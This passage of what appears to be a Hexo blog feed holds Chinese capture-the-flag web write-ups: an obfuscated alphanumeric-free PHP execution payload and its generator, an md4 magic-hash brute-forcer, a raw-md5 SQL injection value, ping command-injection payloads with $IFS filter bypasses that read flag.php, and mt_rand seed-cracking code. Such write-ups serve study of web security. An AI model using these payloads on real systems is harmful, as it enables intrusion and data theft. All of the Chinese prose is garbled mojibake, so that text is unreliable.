class="keyword">else</span>:</span><br><span class="line">        strings+=<span class="string">"\""</span>+j+<span class="string">"\"."</span></span><br><span class="line">    <span class="comment"># print(strings)</span></span><br><span class="line">strings=strings[:<span class="number">-1</span>]+<span class="string">';'</span></span><br><span class="line"></span><br><span class="line">strings += <span class="string">'$__($___);//'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(strings)</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å¾ˆå¥½æ‡‚çš„ï¼Œè¿™é‡Œå°±ä¸è§£é‡Šäº†ï¼Œpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;);$___&#x3D;$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;!&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.&quot; &quot;.&quot;&#x2F;&quot;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;!&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;;$__($___);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><img src="/2020/09/05/DASAugust/7.png" class=""><p>é€šè¿‡è¿™é“é¢˜æä¾›äº†æ–°æ€è·¯ï¼Œä¹‹åç¢°åˆ°ç±»ä¼¼çš„ä¹Ÿå¯ä»¥å°è¯•ç±»ä¼¼çš„æ–¹æ³•</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å®‰æ’å¤§å­¦&quot;&gt;&lt;a href=&quot;#å®‰æ’å¤§å­¦&quot; class=&quot;headerlink&quot; title=&quot;å®‰æ’å¤§å­¦&quot;&gt;&lt;/a&gt;å®‰æ’å¤§å­¦
    
    </summary>
    
    
    
      <category term="DAS" scheme="http://yoursite.com/tags/DAS/"/>
    
  </entry>
  
  <entry>
    <title>å¼ºç½‘æ¯</title>
    <link href="http://yoursite.com/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    <id>http://yoursite.com/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/</id>
    <published>2020-08-29T02:18:36.000Z</published>
    <updated>2020-08-29T03:17:24.624Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€<a id="more"></a></h2><p>å¼ºç½‘å…ˆé”‹çš„webè¿˜å¥½ï¼Œå•ç‹¬åˆ†ç±»çš„webå¤ªéš¾äº†ï¼Œæ˜¯è‡ªå·±å¤ªèœäº†â€¦</p><h1 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h1><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>md4ç¢°æ’</li><li>MD5ç»•è¿‡</li><li>sqlæ³¨å…¥ä¸­çš„md5</li></ul><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>LEVEL1</p><p>æ‰¾æ–‡ç« <a href="https://crdx.org/post/hsctf-2019-md5-minus-minus" target="_blank" rel="noopener">https://crdx.org/post/hsctf-2019-md5-minus-minus</a></p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$i = <span class="number">0</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((++$c % <span class="number">1000000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        printf(<span class="string">"."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n = <span class="string">"0e"</span> . $i++;</span><br><span class="line">    $h = hash(<span class="string">'md4'</span>, $n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n == $h) &#123;</span><br><span class="line">        printf(<span class="string">"\nFound: $n\n"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#Found: 0e251288019</span></span><br></pre></td></tr></table></figure><p>LEVEL2</p><p>è¿™ä¸€æ­¥å¾ˆç®€å•æ•°ç»„ç»•è¿‡å³å¯</p><p>LEVEL3</p><p>è¦è®©<code>&quot;.md5($pass,true).&quot;</code>ä¸ºtrue</p><p>è¿™ç¯‡æ–‡ç« å™è¿°è¯¦ç»†<a href="https://www.pianshen.com/article/789754585/" target="_blank" rel="noopener">https://www.pianshen.com/article/789754585/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>;;) &#123; </span><br><span class="line"> <span class="keyword">for</span> ($c = <span class="number">0</span>; $c &lt; <span class="number">1000000</span>; $c++, $i++)</span><br><span class="line">  <span class="keyword">if</span> (stripos(md5($i, <span class="keyword">true</span>), <span class="string">'\'or\''</span>) !== <span class="keyword">false</span>)</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"\nmd5($i) = "</span> . md5($i, <span class="keyword">true</span>) . <span class="string">"\n"</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#content: ffifdyop</span></span><br><span class="line"><span class="comment">#hex: 276f722736c95d99e921722cf9ed621c</span></span><br><span class="line"><span class="comment">#raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span></span><br><span class="line"><span class="comment">#string: 'or'6]!r,b</span></span><br></pre></td></tr></table></figure><p>æœ€åçš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash1&#x3D;0e251288019&amp;hash2[]&#x3D;1&amp;hash3[]&#x3D;2&amp;hash4&#x3D;ffifdyop</span><br></pre></td></tr></table></figure><img src="/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/1.png" class=""><h2 id="ä¸»åŠ¨"><a href="#ä¸»åŠ¨" class="headerlink" title="ä¸»åŠ¨"></a>ä¸»åŠ¨</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>ç»•è¿‡flagè¿‡æ»¤</li></ul><h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ping -c 3 $_GET[ip]"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1|ls</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹å½“å‰ç›®å½•æ–‡ä»¶ï¼Œflag.phpå’Œindex.php</p><p>ç”¨ä¹‹å‰é‡åˆ°è¿‡çš„é¢˜ç›®çš„payloadå³å¯ï¼Œ$IFS$9ç»•è¿‡ç©ºæ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;ca\t$IFS$9fla$a.php</span><br></pre></td></tr></table></figure><p>ç¯å¢ƒå…³äº†ï¼Œå°±æŒ‚ä¸äº†å‡ºflagçš„å›¾äº†</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€
    
    </summary>
    
    
    
      <category term="å¼ºç½‘æ¯" scheme="http://yoursite.com/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>é’“é±¼åŸæ¯</title>
    <link href="http://yoursite.com/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/"/>
    <id>http://yoursite.com/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/</id>
    <published>2020-08-27T14:20:11.000Z</published>
    <updated>2020-08-27T16:28:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€<a id="more"></a></h2><p>web pwnå¤ªé¡¶äº†orzï¼Œä¸ä¼šï¼Œè¿˜æœ‰ä¸€é¢˜æ ¹æœ¬æ²¡æ€è·¯â€¦</p><p>åªèƒ½è¯´è¿™æœ‰å¥–é‡‘çš„æ¯”èµ›pyå¾ˆä¸¥é‡ï¼Œæœ€å1åˆ†é’Ÿå›¢é˜Ÿç‹‚æ‰åæ¬¡â€¦</p><p>è‡ªå·±å¤ªèœäº†ï¼Œæ²¡å•¥è¾“å‡ºï¼Œæ‹–åè…¿äº†â€¦</p><h2 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a><strong>easyseed</strong></h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>mt_rand</li><li>php_mt_randçˆ†ç ´ç§å­</li><li>XFF</li></ul><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€å§‹ä¸€ä¸ªå¼¹çª—ï¼Œæç¤ºä¸æ˜¯ä¸»äººï¼Œå¼€å§‹æ²¡åœ¨æ„ï¼Œåé¢åƒå¤§äºâ€¦</p><p>index.bak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*************************</span><br><span class="line">$lock &#x3D; random(6, &#39;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#39;);</span><br><span class="line">$key &#x3D; random(16, &#39;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#39;);</span><br><span class="line"></span><br><span class="line">function random($length, $chars &#x3D; &#39;0123456789ABC&#39;) &#123;</span><br><span class="line">    $hash &#x3D; &#39;&#39;;</span><br><span class="line">    $max &#x3D; strlen($chars) - 1;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .&#x3D; $chars[mt_rand(0, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆç†Ÿæ‚‰ï¼Œé¢˜ç›®æœ¬èº«ä¹Ÿè¯´äº†æ˜¯seedï¼Œå…ˆè½¬æ¢ä¸€ä¸‹ï¼Œå…¬é’¥åœ¨cookieç§å¯ä»¥çœ‹åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"vEUHaY"</span>; <span class="comment">//å…¬é’¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">#<span class="number">21</span> <span class="number">21</span> <span class="number">0</span> <span class="number">51</span> <span 